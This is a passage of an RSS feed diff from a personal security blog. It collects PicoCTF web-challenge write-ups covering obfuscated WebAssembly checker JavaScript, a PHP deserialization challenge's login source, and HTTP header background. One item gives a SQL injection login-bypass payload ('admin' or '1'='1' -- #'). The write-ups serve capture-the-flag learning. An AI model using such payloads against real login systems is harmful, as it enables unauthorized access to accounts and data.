+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">196&lt;/span>)](&lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">209&lt;/span>)](&lt;span style="color:#a6e22e">idx&lt;/span>), &lt;span style="color:#a6e22e">idx&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>](&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">215&lt;/span>)]), &lt;span style="color:#a6e22e">exports&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">202&lt;/span>)]() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">?&lt;/span> document[&lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">208&lt;/span>)] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">206&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">211&lt;/span>))[&lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">213&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 3</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-3/</guid><description>&lt;h1 id="picoctf---some-assembly-required-3">
+ PicoCTF - Some Assembly Required 3
+ &lt;a class="anchor" href="#picoctf---some-assembly-required-3">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./build/wasm2c qCCYI0ajpD.wasm -o dump.c
+&lt;/code>&lt;/pre>&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler rTEuOmSfG3.js&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">&amp;#39;use strict&amp;#39;;
+const str_list = [&amp;#34;exports&amp;#34;, &amp;#34;270328ewawLo&amp;#34;, &amp;#34;instantiate&amp;#34;, &amp;#34;1OsuamQ&amp;#34;, &amp;#34;Incorrect!&amp;#34;, &amp;#34;length&amp;#34;, &amp;#34;copy_char&amp;#34;, &amp;#34;value&amp;#34;, &amp;#34;1512517ESezaM&amp;#34;, &amp;#34;innerHTML&amp;#34;, &amp;#34;check_flag&amp;#34;, &amp;#34;result&amp;#34;, &amp;#34;1383842SQRPPf&amp;#34;, &amp;#34;924408cukzgO&amp;#34;, &amp;#34;getElementById&amp;#34;, &amp;#34;418508cLDohp&amp;#34;, &amp;#34;input&amp;#34;, &amp;#34;Correct!&amp;#34;, &amp;#34;573XsMMHp&amp;#34;, &amp;#34;arrayBuffer&amp;#34;, &amp;#34;183RUQBDE&amp;#34;, &amp;#34;38934oMACea&amp;#34;];
+const tranfer_fn = function(url, whensCollection) {
+ /** @type {number} */
+ url = url - 285;
+ let _0x143f7d = str_list[url];
+ return _0x143f7d;
+};
+(function(data, oldPassword) {
+ const tranfer_fn = tranfer_fn;
+ for (; !![];) {
+ try {
+ const userPsd = -parseInt(&amp;#34;length&amp;#34;) + -parseInt(&amp;#34;573XsMMHp&amp;#34;) + -parseInt(&amp;#34;innerHTML&amp;#34;) * -parseInt(&amp;#34;getElementById&amp;#34;) + -parseInt(&amp;#34;38934oMACea&amp;#34;) + parseInt(&amp;#34;value&amp;#34;) + -parseInt(&amp;#34;Incorrect!&amp;#34;) * -parseInt(&amp;#34;instantiate&amp;#34;) + parseInt(&amp;#34;arrayBuffer&amp;#34;);
+ if (userPsd === oldPassword) {
+ break;
+ } else {
+ data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
+ }
+ } catch (_0x289152) {
+ data[&amp;#34;push&amp;#34;](data[&amp;#34;shift&amp;#34;]());
+ }
+ }
+})(str_list, 970828);
+let exports;
+(async() =&amp;gt; {
+ const tranfer_fn = tranfer_fn;
+ let rpm_traffic = await fetch(&amp;#34;./qCCYI0ajpD&amp;#34;);
+ let m = await WebAssembly[&amp;#34;1512517ESezaM&amp;#34;](await rpm_traffic[&amp;#34;1OsuamQ&amp;#34;]());
+ let updatedEdgesById = m[&amp;#34;instance&amp;#34;];
+ exports = updatedEdgesById[&amp;#34;copy_char&amp;#34;];
+})();
+/**
+ * @return {undefined}
+ */
+function onButtonPress() {
+ const tranfer_fn = tranfer_fn;
+ let data = document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;exports&amp;#34;)[&amp;#34;924408cukzgO&amp;#34;];
+ for (let i = 0; i &amp;lt; data[&amp;#34;result&amp;#34;]; i++) {
+ exports[&amp;#34;1383842SQRPPf&amp;#34;](data[&amp;#34;charCodeAt&amp;#34;](i), i);
+ }
+ exports[&amp;#34;1383842SQRPPf&amp;#34;](0, data[&amp;#34;result&amp;#34;]);
+ if (exports[&amp;#34;input&amp;#34;]() == 1) {
+ document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;418508cLDohp&amp;#34;] = &amp;#34;270328ewawLo&amp;#34;;
+ } else {
+ document[&amp;#34;183RUQBDE&amp;#34;](&amp;#34;Correct!&amp;#34;)[&amp;#34;innerHTML&amp;#34;] = &amp;#34;check_flag&amp;#34;;
+ }
+}
+;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - SQLiLite</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---sqlilite/</guid><description>&lt;h1 id="picoctf---sqlilite">
+ PicoCTF - SQLiLite
+ &lt;a class="anchor" href="#picoctf---sqlilite">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://saturn.picoctf.net:55837/">http://saturn.picoctf.net:55837/&lt;/a>&lt;/p>
+&lt;h2 id="exploit---sqli">
+ Exploit - sqli
+ &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload:
+&lt;code>admin' or '1'='1' -- #&lt;/code>
+&lt;img src="https://i.imgur.com/yNgpTiY.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Super Serial</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---super-serial/</guid><description>&lt;h1 id="picoctf---super-serial">
+ PicoCTF - Super Serial
+ &lt;a class="anchor" href="#picoctf---super-serial">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://hackmd.io/@SBK6401/B1I5n1pns">php unserialization&lt;/a>&lt;/p>
+&lt;h2 id="hint">
+ Hint
+ &lt;a class="anchor" href="#hint">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>The flag is at ../flag&lt;/li>
+&lt;/ul>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>robot.txt
+一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是&lt;code>sqli&lt;/code>，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且&lt;code>/admin.phps&lt;/code>沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析
+&lt;img src="https://hackmd.io/_uploads/BkcThh0Pn.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>index.phps
+用index.phps查看source code發現有一些其他怪東西，包括&lt;code>authentication.phps&lt;/code>和&lt;code>cookie.php&lt;/code>
+:::spoiler Real Source Code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+require_once(&amp;#34;cookie.php&amp;#34;);
+
+if(isset($_POST[&amp;#34;user&amp;#34;]) &amp;amp;&amp;amp; isset($_POST[&amp;#34;pass&amp;#34;])){
+ $con = new SQLite3(&amp;#34;../users.db&amp;#34;);
+ $username = $_POST[&amp;#34;user&amp;#34;];
+ $password = $_POST[&amp;#34;pass&amp;#34;];
+ $perm_res = new permissions($username, $password);
+ if ($perm_res-&amp;gt;is_guest() || $perm_res-&amp;gt;is_admin()) {
+ setcookie(&amp;#34;login&amp;#34;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), &amp;#34;/&amp;#34;);
+ header(&amp;#34;Location: authentication.php&amp;#34;);
+ die();
+ } else {
+ $msg = &amp;#39;&amp;lt;h6 class=&amp;#34;text-center&amp;#34; style=&amp;#34;color:red&amp;#34;&amp;gt;Invalid Login.&amp;lt;/h6&amp;gt;&amp;#39;;
+ }
+}
+?&amp;gt;
+
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;link href=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34; integrity=&amp;#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;
+&amp;lt;link href=&amp;#34;style.css&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
+&amp;lt;script src=&amp;#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&amp;#34; integrity=&amp;#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;/head&amp;gt;
+ &amp;lt;body&amp;gt;
+ &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;row&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;col-sm-9 col-md-7 col-lg-5 mx-auto&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;card card-signin my-5&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
+ &amp;lt;h5 class=&amp;#34;card-title text-center&amp;#34;&amp;gt;Sign In&amp;lt;/h5&amp;gt;
+ &amp;lt;?php if (isset($msg)) echo $msg; ?&amp;gt;
+ &amp;lt;form class=&amp;#34;form-signin&amp;#34; action=&amp;#34;index.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user&amp;#34; name=&amp;#34;user&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Username&amp;#34; required autofocus&amp;gt;
+ &amp;lt;label for=&amp;#34;user&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
+ &amp;lt;/div&amp;gt;
+
+ &amp;lt;div class=&amp;#34;form-label-group&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;pass&amp;#34; name=&amp;#34;pass&amp;#34; class=&amp;#34;form-control&amp;#34; placeholder=&amp;#34;Password&amp;#34; required&amp;gt;
+ &amp;lt;label for=&amp;#34;pass&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
+ &amp;lt;/div&amp;gt;
+
+ &amp;lt;button class=&amp;#34;btn btn-lg btn-primary btn-block text-uppercase&amp;#34; type=&amp;#34;submit&amp;#34;&amp;gt;Sign in&amp;lt;/button&amp;gt;
+ &amp;lt;/form&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</guid><description>&lt;h1 id="picoctf---who-are-you">
+ PicoCTF - Who are you?
+ &lt;a class="anchor" href="#picoctf---who-are-you">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="chrome-85-更新淺談-referer-policy-和更新影響">
+ &lt;a href="https://www.maxlist.xyz/2020/08/03/chrome-85-referer-policy/">【Chrome 85 更新】淺談 Referer-Policy 和更新影響&lt;/a>
+ &lt;a class="anchor" href="#chrome-85-%e6%9b%b4%e6%96%b0%e6%b7%ba%e8%ab%87-referer-policy-%e5%92%8c%e6%9b%b4%e6%96%b0%e5%bd%b1%e9%9f%bf">#&lt;/a>
+&lt;/h3>
+&lt;blockquote>
+&lt;h3 id="http-referer-是什麼">
+ HTTP Referer 是什麼?
+ &lt;a class="anchor" href="#http-referer-%e6%98%af%e4%bb%80%e9%ba%bc">#&lt;/a>
+&lt;/h3>
+&lt;p>當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。&lt;/p>
+&lt;p>舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 &lt;a href="https://ithelp.ithome.com.tw/">https://ithelp.ithome.com.tw/&lt;/a> 的網址。&lt;/p>&lt;/blockquote>
+&lt;h3 id="rfc-2616---date">
+ &lt;a href="https://datatracker.ietf.org/doc/html/rfc2616#section-14.18">RFC 2616 - Date&lt;/a>
+ &lt;a class="anchor" href="#rfc-2616---date">#&lt;/a>
+&lt;/h3>
+&lt;blockquote>
+&lt;p>The Date general-header field represents the date and time at which
+the message was originated, having the same semantics as orig-date in
+RFC 822. The field value is an HTTP-date, as described in section
+3.3.1; it MUST be sent in RFC 1123 [8]-date format.&lt;/p></description></item></channel></rss>
